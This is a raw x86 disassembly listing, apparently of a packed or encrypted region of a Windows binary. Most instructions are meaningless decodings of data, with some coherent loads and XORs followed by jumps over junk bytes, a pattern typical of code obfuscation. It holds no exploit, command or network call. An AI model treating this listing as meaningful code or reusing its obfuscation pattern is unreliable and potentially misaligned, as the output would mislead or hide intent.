  411d1f:	add    ch,BYTE PTR [edi-0x78b970a]
  411d25:	xor    eax,DWORD PTR [ebx+0x5f]
  411d28:	cld    
  411d29:	push   es
  411d2a:	les    ecx,FWORD PTR [edi+0x44904ab4]
  411d30:	arpl   WORD PTR [ecx-0x6d],sp
  411d33:	loope  0x411d49
  411d35:	sub    BYTE PTR [ebx],dh
  411d37:	iret   
  411d38:	dec    ebp
  411d39:	inc    eax
  411d3a:	or     edx,eax
  411d3c:	cwde   
  411d3d:	xor    al,0x66
  411d3f:	pushf  
  411d40:	sbb    eax,0xadf88b21
  411d45:	in     al,dx
  411d46:	jg     0x411cf5
  411d48:	shl    BYTE PTR [eax+0x324e21d2],1
  411d4e:	jp     0x411d66
  411d50:	ins    BYTE PTR es:[edi],dx
  411d51:	cdq    
  411d52:	sub    DWORD PTR [edx+0x1d],edx
  411d55:	mov    dl,0x87
  411d57:	fwait
  411d58:	lods   eax,DWORD PTR ds:[esi]
  411d59:	mov    WORD PTR [esi-0x748989d7],?
  411d5f:	fwait
  411d60:	(bad)  
  411d61:	xchg   ecx,eax
  411d62:	scas   eax,DWORD PTR es:[edi]
  411d63:	loop   0x411d31
  411d65:	or     eax,0x8e4f20df
  411d6a:	or     al,0x82
  411d6c:	add    DWORD PTR [edi],ebp
  411d6e:	add    DWORD PTR [ebx-0x32ee732a],0xad88873
  411d78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d79:	or     ebx,DWORD PTR [edx+0x1b873bfb]
  411d7f:	das    
  411d80:	imul   eax,DWORD PTR [edx+0x5ef8fc32],0x5a
  411d87:	sti    
  411d88:	add    DWORD PTR [eax+0x9587921],esi
  411d8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d8f:	js     0x411d63
  411d91:	push   0x77
  411d93:	mov    dh,0x11
  411d95:	sti    
  411d96:	add    al,BYTE PTR [ecx-0x67]
  411d99:	add    eax,0x8232492a
  411d9e:	test   esp,esi
  411da0:	pop    eax
  411da1:	in     eax,0x81
  411da3:	xchg   BYTE PTR [edx+0x16],cl
  411da6:	icebp  
  411da7:	jae    0x411d4f
  411da9:	push   ss
  411daa:	and    al,BYTE PTR [ebp+0x6c]
  411dad:	add    BYTE PTR [edi],dh
  411daf:	pop    edi
  411db0:	push   ss
  411db1:	fnstcw WORD PTR [edi-0x601d0682]
  411db7:	adc    al,0x68
  411db9:	lods   al,BYTE PTR ds:[esi]
  411dba:	adc    al,0x4a
  411dbc:	fdivr  QWORD PTR [eax]
  411dbe:	push   0xd4d29e51
  411dc3:	out    0x92,eax
  411dc5:	ja     0x411d98
  411dc7:	aam    0xe4
  411dc9:	pop    esi
  411dca:	lahf   
  411dcb:	bnd call 0x69cf9f83
  411dd1:	pop    esp
  411dd2:	xchg   ecx,eax
  411dd3:	pop    ebx
  411dd4:	sbb    esp,edx
  411dd6:	cld    
  411dd7:	idiv   cl
  411dd9:	loope  0x411dca
  411ddb:	or     al,BYTE PTR [ecx]
  411ddd:	(bad)  es:[edi]
  411de0:	pop    esp
  411de1:	add    ebx,0x15
  411de4:	enter  0x63ee,0x1b
  411de8:	mov    ebx,0x7dda1502
  411ded:	daa    
  411dee:	clc    
  411def:	cmp    ch,ah
  411df1:	push   0x43
  411df3:	cli    
  411df4:	shl    edi,0x5f
  411df7:	lods   eax,DWORD PTR ds:[esi]
  411df8:	or     edi,DWORD PTR [ecx-0x5df09a82]
  411dfe:	cmp    ebx,DWORD PTR [ebx-0x64d8e140]
  411e04:	(bad)  
  411e05:	ins    BYTE PTR es:[edi],dx
  411e06:	sub    eax,0x2088fb0c
  411e0b:	dec    ecx
  411e0c:	add    bl,al
  411e0e:	cs or  ah,dl
  411e11:	xchg   BYTE PTR [eax-0xab59410],dh
  411e17:	into   
  411e18:	jno    0x411e61
  411e1a:	(bad)  
  411e1c:	cmp    bh,BYTE PTR [esi]
  411e1e:	mov    bl,0x3a
  411e20:	xor    eax,0xad379c1a
  411e25:	add    ebp,DWORD PTR [edx]
  411e27:	push   ebx
  411e28:	hlt    
  411e29:	mov    cl,0xb9
  411e2b:	repnz clc 
  411e2d:	pop    esp
  411e2e:	cdq    
  411e2f:	in     al,dx
  411e30:	inc    eax
  411e31:	repz mov ch,0x81
  411e34:	dec    edi
  411e35:	pop    eax
  411e36:	mov    eax,0x9d663fe7
  411e3b:	dec    eax
  411e3c:	dec    eax
  411e3d:	fidivr WORD PTR [ecx+0x35fef846]
  411e43:	sub    edx,edx
  411e45:	fild   QWORD PTR [eax-0x7408e2ba]
  411e4b:	in     eax,0xa
  411e4d:	pop    edx
  411e4e:	in     al,0x46
  411e50:	and    ecx,DWORD PTR [edi]
  411e52:	int3   
  411e53:	clc    
  411e54:	rep stos BYTE PTR es:[edi],al
  411e56:	add    DWORD PTR [esi-0x66],esi
  411e59:	icebp  
  411e5a:	adc    DWORD PTR [edi],esp
  411e5c:	cmp    cl,al
  411e5e:	jmp    0x411eb6
  411e60:	push   es
  411e61:	stos   BYTE PTR es:[edi],al
  411e62:	jecxz  0x411e87
  411e64:	js     0x411ecb
  411e66:	adc    eax,0x40bbdc84
  411e6b:	test   al,0xc
  411e6d:	fbstp  TBYTE PTR [ebx+0x3e]
  411e70:	jb     0x411e4f
  411e72:	add    al,0x9b
  411e74:	arpl   cx,ax
  411e76:	in     al,0x84
  411e78:	dec    esi
  411e79:	ins    DWORD PTR es:[edi],dx
  411e7a:	mov    bh,dh
  411e7c:	pushf  
  411e7d:	jmp    0xc1b8:0x52d664a6
  411e84:	adc    bl,0x90
  411e87:	add    eax,0xc90aa5fc
  411e8c:	pop    esp
  411e8d:	retf   0x1a1d
  411e90:	call   FWORD PTR [eax-0x2a]
  411e93:	mov    cl,0x32
  411e95:	call   0xee74:0x524c2bba
  411e9c:	je     0x411e45
  411e9e:	(bad)  
  411e9f:	mov    edx,0x8015cf13
  411ea4:	cdq    
  411ea5:	or     BYTE PTR [esi+ebp*4],dh
  411ea8:	enter  0xe118,0x94
  411eac:	out    dx,eax
  411ead:	dec    ebp
  411eae:	pop    esi
  411eaf:	aas    
  411eb0:	pushf  
  411eb1:	jmp    0x411f0b
  411eb3:	mov    ds:0xc6fbc81d,al
  411eb8:	mov    ah,0x1a
  411eba:	hlt    
  411ebb:	stos   BYTE PTR es:[edi],al
  411ebc:	fldenv [edi+esi*2]
  411ebf:	adc    al,0x37
  411ec1:	jecxz  0x411e53
  411ec3:	test   BYTE PTR [ebx+eax*4+0x53e5ed2e],bh
  411eca:	outs   dx,BYTE PTR ds:[esi]
  411ecb:	adc    ecx,ebx
  411ecd:	lds    edx,FWORD PTR [edx]
  411ecf:	cmp    eax,0xc40f59a3
  411ed4:	jns    0x411ee1
  411ed6:	hlt    
  411ed7:	fwait
  411ed8:	sub    dl,dl
  411eda:	enter  0x568e,0xb0
  411ede:	lock shr DWORD PTR [edi+0x2a],1
  411ee2:	sub    DWORD PTR [eax],edx
  411ee4:	mov    eax,ds:0x94042021
  411ee9:	pop    ebx
  411eea:	or     eax,0xd91ea2d8
  411eef:	ret    0xe430
  411ef2:	push   ebx
  411ef3:	pop    ecx
  411ef4:	sub    DWORD PTR [esi+0x45777f34],eax
  411efa:	or     esi,ebx
  411efc:	xchg   ebx,eax
  411efd:	out    dx,al
  411efe:	or     BYTE PTR [edi+0x7e],dl
  411f01:	call   FWORD PTR [ecx]
  411f03:	imul   ecx,DWORD PTR [edx-0x32],0xe9d8e0d7
  411f0a:	cmp    edx,DWORD PTR [ecx]
  411f0c:	jmp    0x4c0e:0xba647828
  411f13:	popa   
  411f14:	mov    eax,0xaec7e8bf
  411f19:	sbb    BYTE PTR [edi-0x6bcdffae],0x64
  411f20:	pusha  
  411f21:	test   al,0x84
  411f23:	in     al,0x65
  411f25:	cmp    eax,0x3fc5cd6f
  411f2a:	dec    eax
  411f2b:	sub    cl,dh
  411f2d:	xor    edx,DWORD PTR [ebx]
  411f2f:	mov    ebx,0xaf3bb38f
  411f34:	retf   0xcf50
  411f37:	mov    BYTE PTR [ebx+0x5387b278],dl
  411f3d:	inc    edx
  411f3e:	jmp    0x411f30
  411f40:	inc    ecx
  411f41:	add    al,0x5e
  411f43:	jmp    0x29a53bdb
  411f48:	or     bh,BYTE PTR [edi-0x12c4e1e5]
  411f4e:	test   DWORD PTR [ebx+0x78],eax
  411f51:	lods   eax,DWORD PTR ds:[esi]
  411f52:	adc    bh,ah
  411f54:	ret    0x5788
  411f57:	ret    0xb9ef
  411f5a:	mov    ?,WORD PTR [edx]
  411f5c:	jns    0x411fc5
  411f5e:	cmc    
  411f5f:	repz push cs
  411f61:	and    bl,0x25
  411f64:	cmp    eax,0xa6a4080
  411f69:	mov    ecx,0xe86416b8
  411f6e:	test   eax,0x8e5218e5
  411f73:	mov    edx,DWORD PTR [ebp-0x3c]
  411f76:	mov    edi,DWORD PTR [ebp-0x4]
  411f79:	xor    edi,eax
  411f7b:	xor    edx,eax
  411f7d:	jmp    0x412205
  411f82:	rol    dl,1
  411f84:	enter  0xdac3,0xd1
  411f88:	fcmovnu st,st(1)
  411f8a:	xchg   ebp,eax
  411f8b:	add    al,0x8c
  411f8d:	inc    edi
  411f8e:	jnp    0x411f5c
  411f90:	pop    ss
  411f91:	or     eax,0x78786beb
  411f96:	in     eax,0x7e
  411f98:	js     0x412012
  411f9a:	js     0xb1472da4
  411fa0:	xchg   ebp,eax
  411fa1:	jo     0x411f9e
  411fa3:	cmp    al,0xed
  411fa5:	dec    edx
  411fa6:	add    BYTE PTR [edi-0x3f1440a4],al
  411fac:	push   edx
  411fad:	repz rol DWORD PTR [ebx],1
  411fb0:	sbb    eax,0xedc61438
  411fb5:	sbb    DWORD PTR [esp+eiz*8],edx
  411fb8:	mul    DWORD PTR [ecx-0x5819cc08]
  411fbe:	call   0xe49ff3bd
  411fc3:	dec    esp
  411fc4:	mov    ds:0xccaa5832,al
  411fc9:	or     ebp,DWORD PTR [edx+0x21]
  411fcc:	adc    DWORD PTR [edx-0x2e],0x2f38fe49
  411fd3:	gs sub eax,0x7ef51c0e
  411fd9:	div    BYTE PTR [ecx+0x1f]
  411fdc:	call   0x8548823d
  411fe1:	pop    ds
  411fe2:	in     eax,dx
  411fe3:	or     eax,0x1ec136b0
  411fe8:	out    0x2,eax
  411fea:	mov    gs,WORD PTR [edi+0x28ce57e7]
  411ff0:	xchg   BYTE PTR [edi+0x69],ch
  411ff3:	jb     0x411faa
  411ff5:	or     dl,BYTE PTR [ebx]
  411ff7:	out    dx,eax
  411ff8:	xor    eax,esp
  411ffa:	mov    cl,bl
  411ffc:	scas   al,BYTE PTR es:[edi]
  411ffd:	jl     0x411ffb
  411fff:	outs   dx,DWORD PTR ss:[esi]
  412001:	fcomp  QWORD PTR [esi+0x2f2f3e87]
  412007:	add    ch,0x6c
  41200a:	pop    esp
  41200b:	push   ebx
  41200c:	pushf  
  41200d:	push   edx
  41200e:	imul   esp,ecx,0xffffffb7
  412011:	jecxz  0x41200b
  412013:	add    DWORD PTR [ecx],0xc046ab28
  412019:	(bad)  
  41201a:	in     al,dx
  41201b:	lds    eax,FWORD PTR [edx+ebp*1]
  41201e:	fimul  WORD PTR [ebx-0x6aab64db]
  412024:	in     eax,0x91
  412026:	loop   0x41200e
  412028:	fidivr WORD PTR [ebp-0x65]
  41202b:	sbb    ebp,ebx
  41202d:	and    DWORD PTR [edx+ecx*4],esi
  412030:	sub    eax,DWORD PTR [ebx-0x7e]
  412033:	cmp    dh,ch
  412035:	aas    
  412036:	xor    al,0x12
  412038:	push   0x24d95d7e
  41203d:	add    DWORD PTR [ebx+eiz*1+0x20c18b2f],esp
  412044:	or     BYTE PTR [esi+0x411bd05b],ch
  41204a:	xor    eax,DWORD PTR [ebp-0x37]
  41204d:	das    
  41204e:	(bad)  
  41204f:	repnz hlt 
  412051:	adc    al,0x9f
  412053:	inc    edi
  412054:	mov    WORD PTR [edi],fs
  412056:	dec    ebp
  412057:	xchg   edi,eax
  412058:	xchg   DWORD PTR [edx],ecx
  41205a:	repz ror esi,1
  41205d:	iret   
  41205e:	int    0x28
  412060:	std    
  412061:	add    eax,0xe7b36fdd
  412066:	enter  0x4383,0xb7
  41206a:	pop    es
  41206b:	sub    eax,0xe8c08e6a
  412070:	test   DWORD PTR [ebx-0x2],ebx
  412073:	popf   
  412074:	sub    cl,BYTE PTR [ecx+ebx*2]
  412077:	cdq    
  412078:	push   ebp
  412079:	in     eax,dx
  41207a:	mov    bh,0x22
  41207c:	je     0x4120f9
  41207e:	dec    ebx
  41207f:	lahf   
  412080:	cmp    edx,esp
  412082:	mov    cl,0x8e
  412084:	push   ds
  412085:	push   eax
  412086:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412087:	loope  0x412108
  412089:	mov    ds:0xeea09429,al
  41208e:	rcr    DWORD PTR [edx+edx*8+0x58],0x22
  412093:	xchg   BYTE PTR [edi-0x71],dh
  412096:	rol    BYTE PTR [eax-0x6b5e5096],cl
  41209c:	fsub   DWORD PTR [ebx-0x75fbbb7c]
  4120a2:	push   esi
  4120a3:	jbe    0x41204c
  4120a5:	jmp    0x4120f6
  4120a7:	and    BYTE PTR [edx],dh
  4120a9:	xor    eax,0xeca72de9
  4120ae:	dec    eax
  4120af:	test   cl,dl
  4120b1:	call   0x9743:0xb3e56b79
  4120b8:	(bad)  
  4120b9:	jne    0x4120b4
  4120bb:	jle    0x41209f
  4120bd:	dec    eax
  4120be:	aas    
  4120bf:	and    al,0x31
  4120c1:	lds    ebx,FWORD PTR [esi]
  4120c3:	xor    cl,BYTE PTR [esi]
  4120c5:	xchg   bl,bh
  4120c7:	scas   eax,DWORD PTR es:[edi]
  4120c8:	jb     0x4120b8
  4120ca:	(bad)  
  4120cb:	into   
  4120cc:	(bad)  
  4120cd:	sahf   
  4120ce:	outs   dx,DWORD PTR ds:[esi]
  4120cf:	push   esi
  4120d0:	fs adc eax,0xe8e909ed
  4120d6:	les    eax,FWORD PTR [edx-0x5e1e08c2]
  4120dc:	retf   0x8ead
  4120df:	cmc    
  4120e0:	push   esp
  4120e1:	and    eax,0xe759f2bb
  4120e6:	add    cl,dl
  4120e8:	(bad)  
  4120e9:	sub    eax,0xe2ae2931
  4120ee:	loop   0x412145
  4120f0:	retf   
  4120f1:	jl     0x412123
  4120f3:	shr    DWORD PTR [esi],1
  4120f5:	mov    cl,0x12
  4120f7:	inc    edx
  4120f8:	std    
  4120f9:	sbb    al,0xbe
  4120fb:	mov    al,ds:0xda68036f
  412100:	jns    0x412107
  412102:	in     al,dx
  412103:	sub    eax,0xa1dcf78e
  412108:	mov    ebx,0x8e7296d6
  41210d:	push   ss
  41210e:	inc    ecx
  41210f:	xchg   edi,eax
  412110:	and    al,0x50
  412112:	scas   al,BYTE PTR es:[edi]
  412113:	cdq    
  412114:	ja     0x4120ba
  412116:	sub    edi,DWORD PTR [ebp-0x41]
  412119:	push   ebp
  41211a:	adc    al,0xc5
  41211c:	cmp    ch,ch
  41211e:	mov    edx,DWORD PTR [esi]
  412120:	jl     0x4120b0
  412122:	xor    eax,DWORD PTR [ecx+ecx*4+0xd]
  412126:	out    0x40,al
  412128:	xor    BYTE PTR ds:0x5ad0b1e0,dl
  41212e:	and    bh,BYTE PTR [ecx-0xaa3fec4]
  412134:	bound  ecx,QWORD PTR [edi]
  412136:	mov    ecx,0x88136002
  41213b:	pop    ebp
  41213c:	popa   
  41213d:	sbb    al,0x50
  41213f:	fst    st(0)
  412141:	rol    DWORD PTR [ecx],cl
  412143:	push   edi
  412144:	mov    ecx,0xf161618b
  412149:	jle    0x412174
  41214b:	into   
  41214c:	ret    
  41214d:	cmp    al,0x7c
  41214f:	cmp    DWORD PTR [eax+0x1e4120f1],ebx
  412155:	ja     0x412142
  412157:	imul   esi,DWORD PTR [eax+ebx*8],0x9a0b8273
  41215e:	mov    eax,DWORD PTR [ecx]
  412160:	(bad)
  412163:	stc    
  412164:	or     esp,DWORD PTR [esi+0x23]
  412167:	gs out dx,al
  412169:	sbb    BYTE PTR [eax-0x96fed5e],ah
  41216f:	(bad)  
  412170:	xlat   BYTE PTR ds:[ebx]
  412171:	stc    
  412172:	outs   dx,DWORD PTR ds:[esi]
  412173:	neg    BYTE PTR [ecx-0x29]
  412176:	sub    al,0x3d
  412178:	mov    BYTE PTR [esi],bh
  41217a:	pop    esi
  41217b:	xlat   BYTE PTR ds:[ebx]
  41217c:	aas    
  41217d:	xlat   BYTE PTR ds:[ebx]
  41217e:	inc    ebx
  41217f:	sub    BYTE PTR [ebx+0xd702d8d],ch
  412185:	cmp    al,0xde
  412187:	and    eax,0xef8da16a
  41218c:	mov    cl,0x11
  41218e:	or     BYTE PTR [edx+0x42],bh
  412191:	dec    edx
  412192:	or     esi,0xffffffd2
  412195:	pop    ebx
  412196:	cld    
  412197:	imul   eax,DWORD PTR [ebx],0x74694e58
  41219d:	xlat   BYTE PTR ds:[ebx]
  41219e:	xchg   ebx,eax
  41219f:	xor    BYTE PTR [edi+eax*8-0x71],ah
  4121a3:	loope  0x412157
  4121a5:	(bad)  
  4121a6:	(bad)  
  4121a7:	mov    cl,0x27
  4121a9:	(bad)  
  4121aa:	or     al,0xa2
  4121ac:	aas    
  4121ad:	pop    esp
  4121ae:	adc    dh,BYTE PTR [edi+0x3d4c1cc]
  4121b4:	sbb    eax,0x3cca55e9
  4121b9:	push   edi
  4121ba:	and    ebx,DWORD PTR [edi-0x6ede45e2]
  4121c0:	and    esi,ecx
  4121c2:	mov    eax,ds:0x12ac8562
  4121c7:	not    BYTE PTR [eax-0x13db2d7f]
  4121cd:	push   ecx
  4121ce:	lock cmp DWORD PTR [edi-0x63c69d68],edi
  4121d5:	pop    esp
  4121d6:	fistp  WORD PTR [ebp+0x6d]
  4121d9:	pop    ecx
  4121da:	retf   0x2286
  4121dd:	mov    edi,0x95a25a1c
  4121e2:	lds    esp,FWORD PTR [esi]
  4121e4:	pop    edx
  4121e5:	mov    al,0x12
  4121e7:	pop    es
  4121e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121e9:	call   0xe480:0x3524f8b6
  4121f0:	sbb    BYTE PTR [ebp+0x4c],dl
  4121f3:	popa   
  4121f4:	mov    bl,0x71
  4121f6:	fwait
  4121f7:	test   eax,0x6de11417
  4121fc:	sti    
  4121fd:	inc    esi
  4121fe:	sbb    eax,ecx
  412200:	xchg   DWORD PTR [ebp-0x4b],ebp
  412203:	iret   
  412204:	imul   eax,DWORD PTR [ebx],0xfffffff9
  412207:	add    edx,ecx
  412209:	imul   edx,edi
  41220c:	mov    DWORD PTR [ebp+0xc],edx
  41220f:	mov    edx,DWORD PTR [ebp+0xc]
  412212:	mov    DWORD PTR [ebp-0x24],edx
  412215:	mov    edx,DWORD PTR [ebp-0x8]
  412218:	add    edx,DWORD PTR [ebp-0x40]
  41221b:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  412222:	jmp    0x4124aa
  412227:	(bad)
  41222b:	(bad)  
  41222c:	fcmovnu st,st(1)
  41222e:	shr    esp,1
  412230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412231:	xchg   edx,eax
  412232:	(bad)  
  412233:	pop    ss
  412234:	jle    0x41226a
  412236:	popa   
  412237:	push   eax
  412238:	imul   edi,DWORD PTR [eax+0x78],0x78787ee5
  41223f:	push   ebx
  412240:	pop    esi
  412241:	pop    ebx
  412242:	cs push ss
  412244:	dec    ebp
  412245:	imul   esi,DWORD PTR [eax],0x43
  412248:	rsm    
  41224a:	mov    dh,0xf7
  41224c:	dec    edi
  41224d:	jmp    0x4121fb
  41224f:	lahf   
  412250:	sub    al,0xd
  412252:	icebp  
  412253:	jp     0x412270
  412255:	std    
  412256:	dec    ebx
  412257:	adc    eax,0x63349d49
  41225c:	push   ss
  41225d:	adc    ah,BYTE PTR ds:0x6b2adb2c
  412263:	aas    
  412264:	pusha  
  412265:	pusha  
  412266:	adc    edx,DWORD PTR [ecx-0x6e]
  412269:	mov    esp,0xcec908c7
  41226e:	and    eax,0xb86c5fd6
  412273:	add    DWORD PTR [eax],edx
  412275:	cmp    eax,0x94371e1f
  41227a:	mov    BYTE PTR [ecx],dl
  41227c:	pop    esi
  41227d:	arpl   bx,cx
  41227f:	sub    BYTE PTR [edi-0x6e],dh
  412282:	ror    BYTE PTR [esi],1
  412284:	or     DWORD PTR [edi],0x2a
  412287:	pop    ds
  412288:	jle    0x4122fc
  41228a:	std    
  41228b:	mov    edx,0xb9499617
  412290:	add    al,0xbe
  412292:	out    0x7a,al
  412294:	mov    WORD PTR [edi+0x7e4950e1],?
  41229a:	sub    eax,0x33bf962b
  41229f:	xchg   eax,ebx
  4122a1:	loope  0x4122cc
  4122a3:	dec    ebx
  4122a4:	fisub  WORD PTR [ecx]
  4122a6:	icebp  
  4122a7:	cmp    ebp,esp
  4122a9:	mov    al,0x45
  4122ab:	ret    0xb986
  4122ae:	lahf   
  4122af:	mov    bl,0x34
  4122b1:	out    0xd6,al
  4122b3:	inc    esp
  4122b4:	into   
  4122b5:	mov    ch,0xcd
  4122b7:	adc    BYTE PTR [ebx+0x37],bl
  4122ba:	test   eax,0xd9f87cf2
  4122bf:	sub    DWORD PTR [edx],eax
  4122c1:	fdivr  DWORD PTR [edi+0x3039a076]
  4122c7:	ror    BYTE PTR [edi+0x4c65ffb1],0x98
  4122ce:	jo     0x4122d9
  4122d0:	pusha  
  4122d1:	inc    ecx
  4122d2:	pop    ds
  4122d3:	(bad)  [edx]
  4122d5:	fcmove st,st(6)
  4122d7:	jns    0x4122ae
  4122d9:	pop    esi
  4122da:	sub    eax,0x7ce20f3c
  4122df:	cmp    al,0xdd
  4122e1:	mov    dl,0x44
  4122e3:	ins    DWORD PTR es:[edi],dx
  4122e4:	mov    al,ds:0x66b23973
  4122e9:	stos   DWORD PTR es:[edi],eax
  4122ea:	fwait
  4122eb:	ja     0x412339
  4122ed:	mov    eax,ds:0x53abcf90
  4122f2:	retf   
  4122f3:	mov    edi,0xb5c7202a
  4122f8:	cmp    DWORD PTR [ebp+edi*4-0x6b648825],esi
  4122ff:	jno    0x4122ac
  412301:	mov    ecx,0xfc9ad4f5
  412306:	ss dec esi
  412308:	(bad)  
  412309:	add    edx,DWORD PTR [edx]
  41230b:	scas   eax,DWORD PTR es:[edi]
  41230c:	out    dx,al
  41230d:	pop    ecx
  41230e:	mov    al,0xda
  412310:	or     eax,DWORD PTR [ebp+0x63]
  412313:	es pop ds
  412315:	fs xchg ebx,eax
  412317:	(bad)
  41231a:	into   
  41231b:	lods   al,BYTE PTR ds:[esi]
  41231c:	cld    
  41231d:	enter  0xe59c,0x4a
  412321:	mov    eax,ds:0x14de3df7
  412326:	jle    0x412315
  412328:	ss into 
  41232a:	inc    esi
  41232b:	push   0xffffff90
  41232d:	mov    esp,0xec5cf2f
  412332:	js     0x412339
  412334:	dec    edx
  412335:	fst    QWORD PTR [ecx-0x44b7784e]
  41233b:	cmp    ecx,DWORD PTR [ecx]
  41233d:	add    al,0xa2
  41233f:	sub    DWORD PTR fs:[edx],0x16f9591b
  412346:	ret    0xcb5c
  412349:	lods   eax,DWORD PTR ds:[esi]
  41234a:	(bad)  
  41234b:	ficomp DWORD PTR [ebp-0x406d680]
  412351:	and    al,0x61
  412353:	jle    0x41231e
  412355:	fisttp WORD PTR [ebp+ebp*4+0x5f499ea7]
  41235c:	cli    
  41235d:	(bad)  
  41235e:	ins    DWORD PTR es:[edi],dx
  41235f:	(bad)  
  412361:	sub    DWORD PTR [ecx-0x4e5ac945],0xffffffd4
  412368:	jl     0x412312
  41236a:	or     eax,0x72f690b0
  41236f:	in     al,0x45
  412371:	jmp    0x24f106d1
  412376:	add    BYTE PTR [ebx+0x350d06b5],0x31
  41237d:	cli    
  41237e:	ins    DWORD PTR es:[edi],dx
  41237f:	pushf  
  412380:	popf   
  412381:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412382:	dec    eax
  412383:	and    dl,BYTE PTR [esi]
  412385:	lds    ecx,FWORD PTR [ebx+0x46]
  412388:	cmp    al,BYTE PTR [ebx-0x29c73b81]
  41238e:	dec    esi
  41238f:	aaa    
  412390:	mov    al,ds:0x2a202ac1
  412395:	sbb    DWORD PTR [ebp-0x44],esi
  412398:	icebp  
  412399:	sub    eax,0x98e1a812
  41239e:	mov    bh,0x9b
  4123a0:	(bad)  
  4123a1:	sub    al,0xea
  4123a3:	(bad)  
  4123a4:	stc    
  4123a5:	iret   
  4123a6:	add    BYTE PTR [ecx],bl
  4123a8:	inc    eax
  4123a9:	inc    edx
  4123aa:	jmp    0x519d:0x8723085b
  4123b1:	ror    al,cl
  4123b3:	jp     0x412391
  4123b5:	hlt    
  4123b6:	pop    eax
  4123b7:	lock out dx,al
  4123b9:	mov    esp,0x8d69cb2e
  4123be:	mov    ax,0x7032
  4123c2:	shl    DWORD PTR [ecx+0x5c],1
  4123c5:	arpl   di,di
  4123c7:	pop    edi
  4123c8:	adc    BYTE PTR ss:[ebp+0x2],ah
  4123cc:	out    0xf1,al
  4123ce:	dec    esi
  4123cf:	std    
  4123d0:	int3   
  4123d1:	mov    eax,DWORD PTR [eax+0x644bf8b1]
  4123d7:	dec    esp
  4123d8:	and    ebp,DWORD PTR [ecx-0x1c]
  4123db:	mov    dl,BYTE PTR ds:0x60bbdea8
  4123e1:	dec    ecx
  4123e2:	test   cl,0xc2
  4123e5:	or     DWORD PTR [ecx],ecx
  4123e7:	pop    eax
  4123e8:	mov    dh,0x1c
  4123ea:	mov    eax,ds:0xcfb03fa8
  4123ef:	les    edi,FWORD PTR [edx-0x5a]
  4123f2:	nop
  4123f3:	shr    BYTE PTR [edi+0x7e],0x8c
  4123f7:	rol    ecx,1
  4123f9:	pushf  
  4123fa:	mov    al,0x4d
  4123fc:	mov    bl,0x89
  4123fe:	mov    ebp,0x86f1055b
  412403:	(bad)  
  412404:	jnp    0x412470
  412406:	add    DWORD PTR [edx],ecx
  412408:	pushf  
  412409:	mov    edx,0x8f1bbc40
  41240e:	outs   dx,BYTE PTR ds:[esi]
  41240f:	jo     0x41246d
  412411:	or     BYTE PTR [eax],dl
  412413:	ficom  WORD PTR [edi-0x423f0e15]
  412419:	sub    ebp,ebx
  41241b:	cld    
  41241c:	(bad)  
  41241d:	in     eax,dx
  41241e:	or     al,0xf8
  412420:	cwde   
  412421:	cmp    BYTE PTR [ebx-0x28],0xbb
  412425:	dec    esp
  412426:	jns    0x412433
  412428:	inc    DWORD PTR [edi+0x66]
  41242b:	inc    ecx
  41242c:	cmp    ecx,0xffffffc0
  41242f:	mov    ebx,0xe037ea8c
  412434:	dec    edx
  412435:	(bad)  
  412436:	rcl    DWORD PTR [ecx-0x60e94460],cl
  41243c:	es push edx
  41243e:	fs leave 
  412440:	(bad)  
  412442:	jp     0x41247f
  412444:	xor    bl,BYTE PTR [ebx-0xf]
  412447:	fstp   QWORD PTR [ecx+0x48]
  41244a:	mov    bh,0xe2
  41244c:	loopne 0x4123d6
  41244e:	repnz sbb eax,DWORD PTR [edx+0x4c]
  412452:	arpl   WORD PTR [ebx-0x1],dx
  412455:	or     eax,0xc6f42449
  41245a:	stos   DWORD PTR es:[edi],eax
  41245b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41245c:	cwde   
  41245d:	cmp    BYTE PTR [edi+0x3c6f040c],ch
  412463:	daa    
  412464:	ret    
  412465:	pop    ds
  412466:	jns    0x4124c3
  412468:	in     al,0x20
  41246a:	mov    eax,0xbad2b87c
  41246f:	sub    DWORD PTR [ebx+edi*4],ebx
  412472:	jns    0x412425
  412474:	pop    ds
  412475:	(bad)  
  412476:	jmp    0xa49c:0xfb67eaee
  41247d:	fcom   st(0)
  41247f:	mov    edx,0xf120f589
  412484:	es gs pop ds
  412487:	ja     0x412480
  412489:	fwait
  41248a:	ret    
  41248b:	(bad)  
  41248c:	jo     0x4124b0
  41248e:	fwait
  41248f:	sub    bh,ch
  412491:	xor    BYTE PTR [ebp+0x2c9191e2],0x13
  412498:	or     BYTE PTR [edi],dl
  41249a:	xlat   BYTE PTR ds:[ebx]
  41249b:	pop    ebx
  41249c:	js     0x412495
  41249e:	lods   eax,DWORD PTR ds:[esi]
  41249f:	inc    eax
  4124a0:	gs add al,0xf9
  4124a3:	fdivr  QWORD PTR [ebp-0x10]
  4124a6:	mov    ch,0x0
  4124a8:	jle    0x412516
  4124aa:	mov    DWORD PTR [ebp-0x1c],edx
  4124ad:	jmp    0x412735
  4124b2:	iret   
  4124b3:	ret    
  4124b4:	rol    esi,0xd1
  4124b7:	(bad)  
  4124b8:	fcmovnu st,st(1)
  4124ba:	mov    ebx,0x3d1ebe60
  4124bf:	xor    DWORD PTR [ebx-0x5e],eax
  4124c2:	cmp    eax,0xe578786e
  4124c7:	jle    0x412541
  4124c9:	js     0x412457
  4124cb:	or     BYTE PTR ds:0x4cab4d8c,ch
  4124d1:	push   edx
  4124d2:	mov    edx,0x73fcbf7a
  4124d7:	out    0xbc,eax
  4124d9:	cwde   
  4124da:	xor    BYTE PTR [eax+edi*4-0x46d3da0f],ah
  4124e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124e2:	mov    gs,WORD PTR [eax]
  4124e4:	rol    ah,0xd9
  4124e7:	push   ss
  4124e8:	and    ah,dh
  4124ea:	lds    ebx,FWORD PTR [edx-0x6c]
  4124ed:	dec    edx
  4124ef:	dec    ebx
  4124f0:	fimul  DWORD PTR [ebx+0x2d318fd9]
  4124f6:	mov    al,cs:0x6ba2f1d2
  4124fc:	bound  esi,QWORD PTR ss:[eax]
  4124ff:	out    dx,eax
  412500:	push   0xf2a0ffa3
  412505:	adc    edi,DWORD PTR [ebp-0x18a00eeb]
  41250b:	pushf  
